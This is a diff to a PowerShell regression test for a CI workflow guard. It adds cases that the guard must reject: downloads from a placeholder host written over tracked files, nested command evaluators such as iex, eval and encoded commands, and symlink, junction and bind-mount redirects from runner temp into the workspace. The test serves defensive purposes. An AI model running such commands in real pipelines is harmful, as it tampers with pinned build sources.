@@ -232,6 +232,60 @@ function New-WorkflowGitScriptConsumerFixture {
     return ($lines -join [Environment]::NewLine)
 }
 
+function New-WorkflowRunnerTempRedirectFixture {
+    param(
+        [Parameter(Mandatory)] [string] $ScriptPath,
+        [Parameter(Mandatory)] [string] $LinkText,
+        [Parameter(Mandatory)] [string] $WriteText,
+        [Parameter(Mandatory)] [string] $Shell,
+        [Parameter(Mandatory)] [ValidateSet('before artifact download', 'after artifact download', 'between guarded invocations')] [string] $Position
+    )
+
+    $lines = [Collections.Generic.List[string]]::new()
+    $lines.Add('jobs:')
+    $lines.Add('  future-consumer:')
+    $lines.Add('    steps:')
+    Add-WorkflowFixtureCheckout -Lines $lines -SequenceIndent 6 -FieldIndent 8 -CheckoutUses 'actions/checkout@v4' -CheckoutRef '${{ github.sha }}'
+
+    $linkStep = @{ Name = 'Create a runner-temp path redirect'; Text = $LinkText; Shell = $Shell }
+    $writeStep = @{ Name = 'Write through the runner-temp path'; Text = $WriteText; Shell = $Shell }
+    $validCheckout = @{
+        Lines = $lines
+        SequenceIndent = 6
+        FieldIndent = 8
+        CheckoutUses = 'actions/checkout@v4'
+        CheckoutRepository = '${{ github.repository }}'
+        IncludeCheckoutRepository = $true
+        CheckoutPath = '.'
+        IncludeCheckoutPath = $true
+        CheckoutRef = '${{ github.sha }}'
+    }
+
+    if ($Position -eq 'before artifact download') {
+        Add-WorkflowFixtureRunSteps -Lines $lines -RunSteps @($linkStep)
+        Add-WorkflowFixtureDownload -Lines $lines -SequenceIndent 6 -FieldIndent 8
+        Add-WorkflowFixtureCheckout @validCheckout
+        Add-WorkflowFixtureDownload -Lines $lines -SequenceIndent 6 -FieldIndent 8
+    }
+    elseif ($Position -eq 'after artifact download') {
+        Add-WorkflowFixtureDownload -Lines $lines -SequenceIndent 6 -FieldIndent 8
+        Add-WorkflowFixtureRunSteps -Lines $lines -RunSteps @($linkStep)
+        Add-WorkflowFixtureCheckout @validCheckout
+        Add-WorkflowFixtureDownload -Lines $lines -SequenceIndent 6 -FieldIndent 8
+    }
+    else {
+        Add-WorkflowFixtureDownload -Lines $lines -SequenceIndent 6 -FieldIndent 8
+        Add-WorkflowFixtureScripts -Lines $lines -SequenceIndent 6 -FieldIndent 8 -ScriptPaths @($ScriptPath)
+        Add-WorkflowFixtureRunSteps -Lines $lines -RunSteps @($linkStep)
+        Add-WorkflowFixtureCheckout @validCheckout
+        Add-WorkflowFixtureDownload -Lines $lines -SequenceIndent 6 -FieldIndent 8
+    }
+
+    Add-WorkflowFixtureRunSteps -Lines $lines -RunSteps @($writeStep)
+    Add-WorkflowFixtureScripts -Lines $lines -SequenceIndent 6 -FieldIndent 8 -ScriptPaths @($ScriptPath)
+    return ($lines -join [Environment]::NewLine)
+}
+
 function Invoke-ReleaseWorkflowScriptSourceGuard {
     param(
         [Parameter(Mandatory)] [object[]] $Workflows,
@@ -391,6 +445,25 @@ fi
         @{ Name = 'curl attached -o nested response'; Text = 'curl -osrc/KeelMatrix.PackageSurface.Cli/README.md https://host/payload'; Shell = 'bash' },
         @{ Name = 'curl remote-name response'; Text = 'curl -O https://host/validate-release.ps1'; Shell = 'bash' },
         @{ Name = 'curl output directory with remote name'; Text = 'curl --output-dir "$GITHUB_WORKSPACE/scripts" -O https://host/validate-release.ps1'; Shell = 'bash' },
+        @{ Name = 'curl config input with hidden root response output'; Text = 'curl --config .curlrc https://host/payload'; Shell = 'bash' },
+        @{ Name = 'curl config equals form with hidden nested response output'; Text = 'curl --config=.curlrc https://host/payload'; Shell = 'bash' },
+        @{ Name = 'curl short config option with hidden response output'; Text = 'curl -K .curlrc https://host/payload'; Shell = 'bash' },
+        @{ Name = 'curl bundled short config option with hidden response output'; Text = 'curl -fsSK.curlrc https://host/payload'; Shell = 'bash' },
+        @{ Name = 'curl config from runner temp remains unsupported'; Text = 'curl --config "${{ runner.temp }}/curlrc" https://host/payload'; Shell = 'bash' },
+        @{ Name = 'quoted bash command hides root curl writer'; Text = "bash -c 'curl --output CHANGELOG.md https://host/payload'"; Shell = 'bash' },
+        @{ Name = 'quoted login shell command hides nested curl writer'; Text = 'sh -lc "curl --dump-header src/KeelMatrix.PackageSurface.Cli/README.md https://host/payload"'; Shell = 'bash' },
+        @{ Name = 'PowerShell command evaluation hides response writer'; Text = "pwsh -Command 'Invoke-WebRequest -Uri https://host/payload -OutFile CHANGELOG.md'"; Shell = 'pwsh' },
+        @{ Name = 'PowerShell short command option hides nested writer'; Text = "pwsh -c 'Set-Content -Path CHANGELOG.md -Value payload'"; Shell = 'pwsh' },
+        @{ Name = 'PowerShell command-with-args evaluation is unsupported'; Text = "pwsh -CommandWithArgs 'Set-Content -Path CHANGELOG.md -Value payload'"; Shell = 'pwsh' },
+        @{ Name = 'PowerShell encoded command is unsupported'; Text = 'powershell -EncodedCommand SQBFAFgA'; Shell = 'pwsh' },
+        @{ Name = 'PowerShell Invoke-Expression hides root writer'; Text = "Invoke-Expression 'Set-Content -Path CHANGELOG.md -Value payload'"; Shell = 'pwsh' },
+        @{ Name = 'PowerShell iex evaluates dynamic command'; Text = 'iex $env:COMMAND'; Shell = 'pwsh' },
+        @{ Name = 'PowerShell quoted call operator hides root writer'; Text = "& 'Set-Content' -Path CHANGELOG.md -Value payload"; Shell = 'pwsh' },
+        @{ Name = 'PowerShell quoted process call hides nested writer'; Text = "& 'pwsh' -Command 'Copy-Item source src/KeelMatrix.PackageSurface.Cli/README.md'"; Shell = 'pwsh' },
+        @{ Name = 'conditional shell eval is unsupported'; Text = 'if eval "$COMMAND"; then printf done; fi'; Shell = 'bash' },
+        @{ Name = 'nested cmd command is unsupported'; Text = 'cmd /c copy payload CHANGELOG.md'; Shell = 'pwsh' },
+        @{ Name = 'nested Python evaluator is unsupported'; Text = 'python -c "open(\"CHANGELOG.md\", \"w\").write(\"payload\")"'; Shell = 'bash' },
+        @{ Name = 'PowerShell process launch is unsupported'; Text = 'Start-Process pwsh -ArgumentList "-Command Set-Content CHANGELOG.md payload"'; Shell = 'pwsh' },
         @{ Name = 'wget -O root tracked response'; Text = 'wget https://host/payload -O CHANGELOG.md'; Shell = 'bash' },
         @{ Name = 'wget bundled short response options to root'; Text = 'wget -qOCHANGELOG.md https://host/payload'; Shell = 'bash' },
         @{ Name = 'wget executable alias bundled response to nested'; Text = 'wget.exe -qO src/KeelMatrix.PackageSurface.Cli/README.md https://host/payload'; Shell = 'bash' },
@@ -461,6 +534,7 @@ fi
         @{ Name = 'dynamic Git output destination'; Text = 'git diff --output=$env:TARGET'; Shell = 'pwsh' },
         @{ Name = 'single-quoted runner-temp-looking destination'; Text = 'Copy-Item source ''$RUNNER_TEMP/package-surface.txt'''; Shell = 'bash' },
         @{ Name = 'runner-temp path that traverses out of the temporary directory'; Text = 'cp source "$RUNNER_TEMP/../PackageSurface/scripts/validate-release.ps1"'; Shell = 'bash' },
+        @{ Name = 'immutable runner-temp expression that traverses into workspace'; Text = 'cp source "${{ runner.temp }}/../PackageSurface/scripts/validate-release.ps1"'; Shell = 'bash' },
         @{ Name = 'dynamic runner-temp suffix'; Text = 'cp source "$RUNNER_TEMP/$RELATIVE_PATH"'; Shell = 'bash' },
         @{ Name = 'unsupported direct-writer destination'; Text = 'cp source'; Shell = 'bash' }
     )
@@ -525,6 +599,7 @@ fi
         @{ Name = 'Quoted Git output compact expression'; Text = 'git diff --output "' + $runnerTempExpression + '/package-surface.patch"'; Shell = 'bash' },
         @{ Name = 'Shell output outside workspace'; Text = 'printf payload > "${{ runner.temp }}/package-surface.txt"'; Shell = 'bash' },
         @{ Name = 'Copy outside workspace'; Text = 'Copy-Item source "${{ runner.temp }}/package-surface.txt"'; Shell = 'pwsh' },
+        @{ Name = 'Copy through a normalized runner-temp suffix'; Text = 'Copy-Item source "${{ runner.temp }}/cache/../package-surface.txt"'; Shell = 'pwsh' },
         @{ Name = 'Named copy destination outside workspace'; Text = 'Copy-Item source -Destination "${{ runner.temp }}/package-surface.txt"'; Shell = 'pwsh' },
         @{ Name = 'curl response outside workspace'; Text = 'curl --output "${{ runner.temp }}/payload.txt" https://host/payload'; Shell = 'bash' },
         @{ Name = 'curl bundled options with response outside workspace'; Text = 'curl -fsSL -o "${{ runner.temp }}/payload.txt" https://host/payload'; Shell = 'bash' },
@@ -556,6 +631,31 @@ fi
         $result = @(Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'safe-external-write.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot -RequiredConsumerNames @('safe-external-write.yml/future-consumer'))
         if ($result.Count -ne 1 -or $result[0].Scripts -notcontains $script) {
             throw "File write '$($case.Name)' to a destination under runner.temp must preserve pinned workspace source."
+        }
+    }
+
+    $runnerTempRedirectCases = @(
+        @{ Name = 'POSIX symlink to workspace root and root write'; Link = 'ln -s "$GITHUB_WORKSPACE" "$RUNNER_TEMP/escape"'; Write = 'curl --output "${{ runner.temp }}/escape/CHANGELOG.md" https://host/payload'; Shell = 'bash' },
+        @{ Name = 'POSIX symlink to nested tree and nested write'; Link = 'ln -s "$GITHUB_WORKSPACE/src/KeelMatrix.PackageSurface.Cli" "$RUNNER_TEMP/escape"'; Write = 'cp source "${{ runner.temp }}/escape/README.md"'; Shell = 'bash' },
+        @{ Name = 'POSIX hard link to tracked root file'; Link = 'ln "$GITHUB_WORKSPACE/CHANGELOG.md" "$RUNNER_TEMP/escape"'; Write = 'printf payload > "${{ runner.temp }}/escape"'; Shell = 'bash' },
+        @{ Name = 'POSIX hard link through cp --link'; Link = 'cp --link "$GITHUB_WORKSPACE/CHANGELOG.md" "$RUNNER_TEMP/escape"'; Write = 'printf payload > "${{ runner.temp }}/escape"'; Shell = 'bash' },
+        @{ Name = 'POSIX hard link through bundled cp option'; Link = 'cp -al "$GITHUB_WORKSPACE" "$RUNNER_TEMP/escape"'; Write = 'printf payload > "${{ runner.temp }}/escape/CHANGELOG.md"'; Shell = 'bash' },
+        @{ Name = 'POSIX bind mount into runner temp'; Link = 'mount -o bind "$GITHUB_WORKSPACE" "$RUNNER_TEMP/escape"'; Write = 'printf payload > "${{ runner.temp }}/escape/CHANGELOG.md"'; Shell = 'bash' },
+        @{ Name = 'Windows junction to workspace root and root write'; Link = 'New-Item -ItemType Junction -Path "$env:RUNNER_TEMP\escape" -Target "$env:GITHUB_WORKSPACE"'; Write = 'Invoke-WebRequest -Uri https://host/payload -OutFile "${{ runner.temp }}\escape\CHANGELOG.md"'; Shell = 'pwsh' },
+        @{ Name = 'Windows symbolic link to nested tree and nested write'; Link = 'New-Item -ItemType SymbolicLink -Path "$env:RUNNER_TEMP\escape" -Target "$env:GITHUB_WORKSPACE\src\KeelMatrix.PackageSurface.Cli"'; Write = 'Copy-Item source "${{ runner.temp }}\escape\README.md"'; Shell = 'pwsh' },
+        @{ Name = 'Windows abbreviated Junction parameter'; Link = 'New-Item -I Junction -Path "$env:RUNNER_TEMP\escape" -Target "$env:GITHUB_WORKSPACE"'; Write = 'Copy-Item source "${{ runner.temp }}\escape\CHANGELOG.md"'; Shell = 'pwsh' },
+        @{ Name = 'Windows aliased dynamic hard-link parameter'; Link = 'ni -Ty:$env:LINK_TYPE -Path "$env:RUNNER_TEMP\escape" -Target "$env:GITHUB_WORKSPACE\CHANGELOG.md"'; Write = 'Copy-Item source "${{ runner.temp }}\escape"'; Shell = 'pwsh' },
+        @{ Name = 'Windows hard link through fsutil'; Link = 'fsutil hardlink create "$env:RUNNER_TEMP\escape" "$env:GITHUB_WORKSPACE\CHANGELOG.md"'; Write = 'Set-Content -Path "${{ runner.temp }}\escape" -Value payload'; Shell = 'pwsh' },
+        @{ Name = 'Windows reparse link created through cmd'; Link = 'cmd /c mklink /J "%RUNNER_TEMP%\escape" "%GITHUB_WORKSPACE%"'; Write = 'curl --output "${{ runner.temp }}\escape\CHANGELOG.md" https://host/payload'; Shell = 'pwsh' },
+        @{ Name = 'PowerShell dynamic reparse type into runner temp'; Link = 'New-Item -ItemType $env:LINK_TYPE -Path "$env:RUNNER_TEMP\escape" -Target "$env:GITHUB_WORKSPACE"'; Write = 'Copy-Item source "${{ runner.temp }}\escape\src\KeelMatrix.PackageSurface.Cli\README.md"'; Shell = 'pwsh' }
+    )
+    foreach ($case in $runnerTempRedirectCases) {
+        foreach ($position in @('before artifact download', 'after artifact download', 'between guarded invocations')) {
+            $fixture = New-WorkflowRunnerTempRedirectFixture -ScriptPath $script -LinkText $case.Link -WriteText $case.Write -Shell $case.Shell -Position $position
+            $rejected = $false
+            try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'runner-temp-redirect.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot }
+            catch { $rejected = $true }
+            if (-not $rejected) { throw "Workflow contract accepted $($case.Name) $position after a pinned checkout." }
         }
     }
 
@@ -905,7 +1005,7 @@ try {
     # exercised through synthetic jobs while the workflow parser below enforces that
     # the real consumers do not invoke repository scripts after downloading artifacts.
     Assert-WorkflowScriptSourceRegressionCoverage -CurrentConsumers @() -RepositoryRoot $root
-    Write-Output 'PASS: checkout-source guard tracks bundled and continued response/file writers, immutable temp paths, tracked-byte restoration, artifact boundaries, and guarded script invocations.'
+    Write-Output 'PASS: checkout-source guard tracks curl config inputs, nested evaluators, response/file writers, runner-temp redirects, tracked-byte restoration, artifact boundaries, and guarded script invocations.'
     if ($SourceGuardOnly) { return }
     $trackedRepositoryFiles = @(git -C $root ls-files)
     if ($LASTEXITCODE -ne 0) { throw 'Unable to enumerate tracked repository files for workflow-consumer checks.' }
